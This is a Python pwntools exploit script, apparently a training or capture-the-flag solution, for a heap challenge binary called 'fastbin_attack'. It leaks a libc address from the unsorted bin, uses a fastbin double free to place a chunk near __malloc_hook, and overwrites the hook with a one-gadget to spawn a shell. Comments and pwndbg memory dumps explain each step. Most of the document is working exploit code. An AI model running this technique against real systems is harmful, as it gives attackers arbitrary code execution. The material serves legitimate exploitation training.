from pwn import *
from sys import *

SERVER = "bin.training.offdef.it"
PORT = "10101"
BINARY = "./fastbin_attack"


if "--remote" in sys.argv:
    r = remote(SERVER, PORT)
else:
    r = process(BINARY)

if "--debug" in sys.argv: 
    gdb.attach(r, """
        #breakpoints
        #b* 
        c
        """)
    input("wait")


#code

timesleep = 0.01
libc= ELF("./libc-2.23.so")


def alloc(size):
    r.recvuntil(b"> ")
    sleep(timesleep)
    r.sendline(b"1")
    sleep(timesleep)
    r.recvuntil(b"Size: ")
    sleep(timesleep)
    r.sendline(b"%d" % size)
    sleep(timesleep)
    r.recvuntil(b"index ")
    sleep(timesleep)
    index = int(r.recvuntil(b"!")[:-1])
    return index

def write(index, data):
    r.recvuntil(b"> ")
    sleep(timesleep)
    r.sendline(b"2")
    sleep(timesleep)
    r.recvuntil(b"Index: ")
    sleep(timesleep)
    r.sendline(b"%d" % index)
    sleep(timesleep)
    r.recvuntil(b"Content: ")
    sleep(timesleep)
    r.send(bytes(data))
    sleep(timesleep)
    r.recvuntil(b"Done!")
    sleep(timesleep)

def read(index):
    r.recvuntil(b"> ")
    sleep(timesleep)
    r.sendline(b"3")
    sleep(timesleep)
    r.recvuntil(b"Index: ")
    sleep(timesleep)
    r.sendline(b"%d" % index)
    sleep(timesleep)
    data = r.recvuntil(b"\nOptions:")[:-len("\nOptions:")]
    return data

def free(index):
    r.recvuntil(b"> ")
    sleep(timesleep)
    r.sendline(b"4")
    sleep(timesleep)
    r.recvuntil(b"Index: ")
    sleep(timesleep)
    r.sendline(b"%d" % index)
    sleep(timesleep)


#leaking libc
a=alloc(0x100)
alloc(0x20)
free(a)
leak = u64(read(a).ljust(8, b'\x00')) - 0x3c4b78 #libc leak
print("[!] Leaked libc: %#x" % leak)
libc.address = leak

"""
To leak the libc we used a simple vulnerability of the unsortedbins. The unsortedbins is a circular list with
a fixed node that closes the loop with inside the index of the unsortedbins list in the libc. So, by forcing
the first allocated chunk to enter the unsortedbins (with a free) you can get inside the heap the libc addr. 
You can check the offset to get the right position. In our case the offset was 0x3c4b78
"""

#fastbin attack

a = alloc(0x60)
b = alloc(0x60)
free(a)
free(b)
free(a)

a = alloc(0x60)
write(a, p64(libc.symbols["__malloc_hook"]-0x23))
alloc(0x60)
alloc(0x60)

"""
Now that we have the libc we can menage to overwrite one from __malloc_hook and __free_hook.
By using the fastbin attack we can properly set where the next allocation is going to write. 
In fact from line 99 to 108 we set that the next allocation is going to write near 
the malloc_hook. Why not malloc-hook but near? Because when we then are going to do the 
last allocation, if the allocation is not aligned with a meaningfull chunck the allocation
control makes the program crash. In this case the free_hook didn't have any available addr, while 
with an offset 0x23 near malloc_hook we had the following scenario

pwndbg> x /40gx 0x7f10039c4b10-0x30
0x7f10039c4ae0:	0x0000000000000000	0x0000000000000000
0x7f10039c4af0:	0x00007f10039c3260	0x0000000000000000
0x7f10039c4b00 <__memalign_hook>:	0x00007f1003685ea0	0x00007f1003685a70
0x7f10039c4b10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
0x7f10039c4b20:	0x0000000000000000	0x0000000000000000
0x7f10039c4b30:	0x0000000000000000	0x0000000000000000
0x7f10039c4b40:	0x0000000000000000	0x0000000000000000
0x7f10039c4b50:	0x00005648307b8070	0x0000000000000000
0x7f10039c4b60:	0x0000000000000000	0x0000000000000000
0x7f10039c4b70:	0x0000000000000000	0x00005648307b8140
0x7f10039c4b80:	0x00005648307b80e0	0x00005648307b80e0
0x7f10039c4b90:	0x00005648307b80e0	0x00007f10039c4b88
0x7f10039c4ba0:	0x00007f10039c4b88	0x00007f10039c4b98
0x7f10039c4bb0:	0x00007f10039c4b98	0x00007f10039c4ba8
0x7f10039c4bc0:	0x00007f10039c4ba8	0x00007f10039c4bb8
0x7f10039c4bd0:	0x00007f10039c4bb8	0x00007f10039c4bc8
0x7f10039c4be0:	0x00007f10039c4bc8	0x00007f10039c4bd8
0x7f10039c4bf0:	0x00007f10039c4bd8	0x00007f10039c4be8
0x7f10039c4c00:	0x00007f10039c4be8	0x00007f10039c4bf8
0x7f10039c4c10:	0x00007f10039c4bf8	0x00007f10039c4c08

pwndbg> x /40gx 0x7f10039c4b10-0x23
0x7f10039c4aed:	0x10039c3260000000	0x000000000000007f
0x7f10039c4afd:	0x1003685ea0000000	0x1003685a7000007f
0x7f10039c4b0d <__realloc_hook+5>:	0x000000000000007f	0x0000000000000000
0x7f10039c4b1d:	0x0000000000000000	0x0000000000000000
0x7f10039c4b2d:	0x0000000000000000	0x0000000000000000
0x7f10039c4b3d:	0x0000000000000000	0x0000000000000000
0x7f10039c4b4d:	0x48307b8070000000	0x0000000000000056
0x7f10039c4b5d:	0x0000000000000000	0x0000000000000000
0x7f10039c4b6d:	0x0000000000000000	0x48307b8140000000
0x7f10039c4b7d:	0x48307b80e0000056	0x48307b80e0000056
0x7f10039c4b8d:	0x48307b80e0000056	0x10039c4b88000056
0x7f10039c4b9d:	0x10039c4b8800007f	0x10039c4b9800007f
0x7f10039c4bad:	0x10039c4b9800007f	0x10039c4ba800007f
0x7f10039c4bbd:	0x10039c4ba800007f	0x10039c4bb800007f
0x7f10039c4bcd:	0x10039c4bb800007f	0x10039c4bc800007f
0x7f10039c4bdd:	0x10039c4bc800007f	0x10039c4bd800007f
0x7f10039c4bed:	0x10039c4bd800007f	0x10039c4be800007f
0x7f10039c4bfd:	0x10039c4be800007f	0x10039c4bf800007f
0x7f10039c4c0d:	0x10039c4bf800007f	0x10039c4c0800007f
0x7f10039c4c1d:	0x10039c4c0800007f	0x10039c4c1800007f

as you can see with 0x23 the chunk was reasonable with a memory of 70 
(7f but the last f is the next chuck bit never checked) where 70 is 60 + 10 of metadata
exactly the memory we have allocated till rightnow 
"""

#run one-gadget
onegadget = 0xf1247
a=alloc(0x60)
write(a, b"A"*0x13 + p64(libc.address+onegadget))

r.recvuntil(b"> ")
sleep(timesleep)
r.sendline(b"1")
sleep(timesleep)
r.recvuntil(b"Size: ")
sleep(timesleep)
r.sendline(b"10")
sleep(timesleep)
print("[!] bin/sh executed")
r.interactive()

"""
now with the last alloc we are going to allocate the 60 bytes at the address we set previously. 
In that addr we have to write with an offset of 0x23 the address of the function we want to execute, 
in our case a onegadget. Why there is just 0x13? Because 0x10 are for the metadata so they are going
to be there anyway. So basically we have overwritten the malloc call function with a onegadget. We now just do 
a random allocation and the bin/sh is called. 
"""